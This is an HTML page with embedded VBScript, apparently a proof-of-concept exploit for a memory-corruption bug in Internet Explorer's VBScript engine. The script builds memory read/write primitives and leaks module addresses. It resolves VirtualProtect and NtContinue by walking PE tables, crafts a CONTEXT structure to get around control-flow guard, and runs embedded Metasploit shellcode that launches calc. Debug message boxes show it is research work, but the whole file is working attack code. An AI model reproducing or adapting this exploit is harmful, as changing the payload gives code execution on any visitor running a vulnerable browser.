<html lang="en">
<head>
<meta http-equiv="x-ua-compatible" content="IE=10">
<meta http-equiv="Expires" content="0">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Cache-control" content="no-cache">
<meta http-equiv="Cache" content="no-cache">
</head>
<body>

<SCRIPT LANGUAGE="VBScript">
	Dim max_col
	Dim index_vul
	Dim index_a
	Dim index_b
	
	Dim array()
	Dim array2(0,6)
	
	Dim util_mem
	Dim fake_array
	Dim fake_str
	
	Class MyClass
		private Sub Class_Initialize
			ReDim array(2)
			IsEmpty(array)
		End Sub

		Public Default Property Get P
			ReDim Preserve array(100000)

			For i = 0 To UBound(array2,2)
                	array2(0,i) = 3
            Next
			For i = 0 To UBound(array)
                	array(i) = array2
            Next
		P=&h0fffffff
		End Property
	End Class
	
	
	Function rw_primit()
		array(index_vul)(index_a+2,0)=fake_array
		IsEmpty(array)
		array(index_b)(0,2)=CDbl("1.74088534731324E-310")'200c 0000 200c 0000
		
		array(index_vul)(index_a,0)=fake_str
		array(index_b)(0,0)=CDbl("6.36598737437801E-314")'0003 0000 0003 0000

		util_mem=array(index_vul)(index_a,0)
		IsEmpty(util_mem)
	End Function
	
	
	
	Function read
		read=LenB(array(index_vul)(index_a+2,0)(util_mem+8))
	End Function

	Function GetUint32(addr)
		Dim value
		array(index_vul)(index_a+2,0)(util_mem+8)=addr +4
		array(index_vul)(index_a+2,0)(util_mem)=8
		value=read()
		array(index_vul)(index_a+2,0)(util_mem)=3
		GetUint32 = value
	End Function
	
	Class EmptyClass
    End Class
	
	
	Function SetMemValue(valkey)
		array(index_vul)(index_a+2,0)(util_mem)=3	
		array(index_vul)(index_a+2,0)(util_mem+8) = valkey 	
    End Function	
	
	Function GetMemValue
        array(index_vul)(index_a+2,0)(util_mem)=3	
		GetMemValue=array(index_vul)(index_a+2,0)(util_mem+8)     	
	End Function
	
	
	Function LeakVBAddr
		
		Set EC = New EmptyClass
		Set array(index_vul)(index_a+4,0) = EC
		array(index_b)(0,4) = CDbl("6.36598737437801E-314")'0003 0000 0003 0000
		
		LeakVBAddr=array(index_vul)(index_a+4,0)
	End Function
	
	
	
	Function read_unit32_low_four(addr)
		' Note: &hffff = -1, &hffff& = 0xffff = 65535
		read_unit32_low_four = GetUint32(addr) And &hffff&
	End Function

	Function read_unit32_low_two(addr)
		read_unit32_low_two = GetUint32(addr) And &hff
	End Function

	Function cmp_str(str1, str2)
		Dim str3, i
		str3 = ""
		For i = 0 To Len(str2) - 1
			str3 = str3 &Chr(read_unit32_low_two(str1 + i))
		Next
		cmp_str = StrComp(UCase(str3), UCase(str2))
	End Function
	
	Function GetBaseAddrByPoiAddr(addr)
		Dim addr_allign
		//MsgBox "GetBaseAddrByPoiAddr"
		//IsEmpty(addr) 
		addr_allign = addr And &hffff0000
		//IsEmpty(addr_allign)
		
		' 20 69 6E 20 44 4F 53 20 | in DOS 
		Do While GetUint32(addr_allign + &h68) <> &h206E6920 Or GetUint32(addr_allign + &h6c) <> &h20534F44
			addr_allign = addr_allign - &h10000
		Loop
		//IsEmpty(addr_allign)
		
		GetBaseAddrByPoiAddr = addr_allign
	End Function
	
	
	
	
	
	Function GetModuleFromImport(mod_base, dllname)
		Dim p,i,pImport
		Dim delta
		//MsgBox "mod_base"
		p = GetUint32(mod_base + 60) ' IMAGE_DOS_HEADER.e_lfanew
		//IsEmpty(mod_base)
		//IsEmpty(mod_base)
		p = GetUint32(mod_base + p + 128) ' IMAGE_DIRECTORY_ENTRY_IMPORT
		//IsEmpty(p)
		pImport = mod_base + p
		//IsEmpty(pImport)
		i = 0
		Do While True
			Dim name_off
			name_off = GetUint32(pImport + i*20 + 12) ' IAMGE_IMPORT_DESCRIPTOR.Name  
			If name_off = 0 Then
				GetModuleFromImport = 3131899904 '&hBAAD0000
				Exit Function
			Else
				If cmp_str(mod_base + name_off, dllname) = 0 Then
					Exit Do
				End If
			End If
			i = i+1
		Loop

		delta = GetUint32(pImport + i*20 + 16)//IAT RVA
		//MsgBox "delta"
		//IsEmpty(dllname)
		//IsEmpty(delta)
		GetModuleFromImport = GetBaseAddrByPoiAddr(GetUint32(mod_base + delta))//取出第一个导入函数地址 获取目标模块基地址
	End Function
	
	
	
	
	Function tostring(ByVal Number, ByVal Length)
		str = Hex(Number)
		If Len(str) < Length Then
			str = String(Length - Len(str), "0") &str
		Else
			str = Right(str, Length)
		End If
		tostring = str
	End Function

	Function addr2str(ByVal value)
		Dim high, low
		high = tostring((value And &hffff0000) / &h10000, 4)
		low  = tostring(value And &hffff&, 4)
		addr2str = Unescape("%u" &low &"%u" &high)
	End Function

	Function make_ntcontinue_bytes
		Dim i, str_addr, bytes, v1_2, v3_4, v5_6, v7_8
		MsgBox "make_ntcontinue_bytes"
		str_addr = tostring(api_NtContinue, 8)
		IsEmpty(str_addr)
		IsEmpty(api_NtContinue)
		IsEmpty(bytes)
		v1_2 = Mid(str_addr, 1, 2)
		IsEmpty(v1_2)
		v3_4 = Mid(str_addr, 3, 2)
		IsEmpty(v3_4)
		v5_6 = Mid(str_addr, 5, 2)
		IsEmpty(v5_6)
		v7_8 = Mid(str_addr, 7, 2)
		IsEmpty(v7_8)
		
		bytes = ""
		bytes = bytes &"%u0000%u" &v7_8 &"00"
		
		IsEmpty(bytes)
		For i=1 To 3
			bytes = bytes &"%u" &v3_4 &v5_6
			bytes = bytes &"%u" &v7_8 &v1_2
		Next
		IsEmpty(bytes)
		
		bytes = bytes &"%u" &v3_4 &v5_6
		IsEmpty(bytes)
		bytes = bytes &"%u00" &v1_2
	
		IsEmpty(bytes)

		make_ntcontinue_bytes = Unescape(bytes)

		IsEmpty(make_ntcontinue_bytes)
	End Function

	Function make_virtualprotect_bytes(addr)//bypass cfg
		Dim bytes
		MsgBox "make_virtualprotect_bytes"
		IsEmpty(bytes)
		bytes = String(&h87ee&, Unescape("%u4141"))
		IsEmpty(bytes) 
					   
		bytes = bytes &addr2str(addr)
		IsEmpty(bytes)
		bytes = bytes &addr2str(addr)
		IsEmpty(bytes)
		bytes = bytes &addr2str(&h3000)
		IsEmpty(bytes)
		bytes = bytes &addr2str(64)
		IsEmpty(bytes)
		bytes = bytes &addr2str(addr - 8)
		IsEmpty(bytes)
		bytes = bytes &String(6, Unescape("%u4242"))
		IsEmpty(bytes)
		
		
		bytes = bytes &make_ntcontinue_bytes()
		IsEmpty(bytes)
		bytes = bytes &String((&h80000 - LenB(bytes)) / 2, Unescape("%u4141"))
		make_virtualprotect_bytes = bytes
	End Function

	Function make_final_bytes(addr)
		Dim bytes
		Dim addr1
		MsgBox "make_final_bytes"
		IsEmpty(addr)
		addr1 = addr + 35
		IsEmpty(addr1)
		bytes = ""
		bytes = bytes &addr2str(addr1)
		IsEmpty(bytes)
		bytes = bytes &String((184 - LenB(bytes)) / 2, Unescape("%4141"))//regs
		IsEmpty(bytes)
		bytes = bytes &addr2str(api_VirtualProtect)//context.eip
		IsEmpty(bytes)
		bytes = bytes &addr2str(27)
		IsEmpty(bytes)
		bytes = bytes &addr2str(0)
		IsEmpty(bytes)
		bytes = bytes &addr2str(addr) //context.esp
		IsEmpty(bytes)
		bytes = bytes &addr2str(35)
		IsEmpty(bytes)
		bytes = bytes &String((1024 - LenB(bytes)) / 2, Unescape("%u4343"))
		IsEmpty(bytes)
		make_final_bytes = bytes //Context
		IsEmpty(make_final_bytes)
	End Function

	Sub trigger_var_clear
		array(index_vul)(index_A+2,0)(util_mem)=&h4d      
	    array(index_vul)(index_A+2,0)(util_mem+8)=0 
	End Sub

	Function shellcode()
		' windows/exec - 196 bytes
		' http://www.metasploit.com
		' VERBOSE=false, EXITFUNC=process, CMD=calc
		sc_str = Unescape("%u0000%u0000%u0000%u0000") &Unescape("%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5%u6c61%u0063")
		MsgBox "shellcode"
		shellcode = sc_str
		IsEmpty(shellcode)
	End Function
	
	
	
	
	
	Function GetProcAddress(mod_base, api_name)
		Dim p,i,pExport
		Dim pAddressOfFunctions,pNameBase,pAddressOfNameOrdinals
		Dim ordinal

		p = GetUint32(mod_base + 60 )       ' IMAGE_DOS_HEADER.e_lfanew
		p = GetUint32(mod_base + p + 120)   ' IMAGE_DIRECTORY_ENTRY_IMPORT

		pExport = mod_base + p
		pAddressOfFunctions = mod_base + GetUint32(pExport + 28)    ' IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
		pNameBase = mod_base + GetUint32(pExport + 32)              ' IMAGE_EXPORT_DIRECTORY.AddressOfNames
		pAddressOfNameOrdinals = mod_base + GetUint32(pExport + 36) ' IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals

		i = 0
		Do While True
			Dim name_off
			name_off = GetUint32(pNameBase + i*4)
			If cmp_str(mod_base+name_off, api_name) = 0 Then
				Exit Do
			End If
			i = i + 1
		Loop
		
		ordinal = read_unit32_low_four(pAddressOfNameOrdinals + i*2)
		p = GetUint32(pAddressOfFunctions + ordinal*4)
		GetProcAddress = mod_base + p
	End Function
	
	
	
	
	
	Set cls = New MyClass
	array(2)=cls

	IsEmpty(array)
	
	max_col=&h0fffffff
	
	
	For i=0 To UBound(array)
		If UBound(array(i),1)-LBound(array(i),1)+1=max_col Then
			index_vul=i
			Exit For
		End If
	Next
	MsgBox(index_vul)
	

	For i=0 To UBound(array(index_vul),1)
		Dim type1 ,type2 ,type3 ,type4
		type1=VarType(array(index_vul)(i,0))
		type2=VarType(array(index_vul)(i+1,0))
		type3=VarType(array(index_vul)(i+3,0))
		type4=VarType(array(index_vul)(i+4,0))
		If(type1 = 2 And type2 = 2 And type3 = 3 And type4 = 3) Then
			index_a=i+3
			array(index_vul)(index_a,0)="AAAA"
			Exit For
		End If
	Next
	
	MsgBox(index_a)
	
	For i=0 To UBound(array,1)
		If array(i)(0,0)=8 Then
			index_b=i
			Exit For
		End If
	next
	MsgBox(index_b)
	
	
	fake_array=Unescape("%u0001%u0880%u0001%u0000%u0000%u0000%u0000%u0000%uffff%u7fff%u0000%u0000")
	fake_str=Unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000")
	rw_primit()
	
	
	vb_adrr=LeakVBAddr()

	
	vbscript_mod_base   = GetBaseAddrByPoiAddr(GetUint32(vb_adrr))
	//IsEmpty(vbscript_mod_base) 
  
    msvcrt_mod_base     = GetModuleFromImport(vbscript_mod_base, "msvcrt.dll")
    //IsEmpty(msvcrt_mod_base) 
	
    kernelbase_mod_base = GetModuleFromImport(msvcrt_mod_base, "kernelbase.dll")
    //IsEmpty(kernelbase_mod_base) 
	
    ntdll_mod_base      = GetModuleFromImport(msvcrt_mod_base, "ntdll.dll")
    //IsEmpty(ntdll_mod_base) 
	
    api_VirtualProtect  = GetProcAddress(kernelbase_mod_base, "VirtualProtect")
    //IsEmpty(api_VirtualProtect)
	
    api_NtContinue      = GetProcAddress(ntdll_mod_base,"NtContinue")
    //IsEmpty(api_NtContinue)



    SetMemValue(shellcode())
    sc = GetMemValue() + 8
	MsgBox "shellcode"
	IsEmpty(sc)
    SetMemValue(make_virtualprotect_bytes(sc))
    v2 = GetMemValue() + &h10FDC

    SetMemValue(make_final_bytes(v2))
    v3 = GetMemValue()
	
    trigger_var_clear()


</script>
</body>
</html>